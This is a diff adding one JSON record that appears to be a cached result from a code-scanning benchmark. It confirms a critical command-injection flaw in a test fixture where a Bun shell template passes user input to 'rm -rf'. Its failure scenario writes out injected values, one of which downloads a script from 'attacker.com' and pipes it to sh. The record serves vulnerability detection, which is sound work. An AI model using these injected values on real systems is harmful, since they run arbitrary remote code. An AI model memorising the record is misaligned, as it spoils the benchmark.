@@ -1,0 +1,8 @@
+{
+  "key": "b08f7e8e1ee2fdaadcb89f375497b118",
+  "file": "positive/rce/bun-shell-interpolated-path.ts",
+  "model": "default",
+  "raw": "```json\n[\n  {\n    \"vulnSlug\": \"rce\",\n    \"lineNumbers\": [11],\n    \"verdict\": \"confirmed\",\n    \"severity\": \"critical\",\n    \"summary\": \"Unsanitized user input interpolated into Bun shell template enables arbitrary command execution.\",\n    \"rationale\": \"Line 11 interpolates the `targetDir` parameter directly into a Bun shell command `$`rm -rf ${targetDir}`` without validation or escaping. The `$` template literal from Bun.shell executes shell commands similar to child_process.execSync. Shell metacharacters in targetDir (e.g., semicolons, backticks, $()) will be interpreted by the shell, allowing injection of arbitrary commands.\",\n    \"failureScenario\": \"Caller invokes cleanupWorkspace with targetDir = \\\"foo; curl attacker.com/malicious.sh | sh\\\" causing the shell to execute rm -rf foo followed by downloading and executing a remote script, or targetDir = \\\"foo $(whoami > /tmp/pwned)\\\" to execute embedded commands.\",\n    \"confidence\": 0.98\n  }\n]\n```",
+  "recordedAt": "2026-08-12T03:44:37.324Z",
+  "elapsedMs": 19733.745922727274
+}
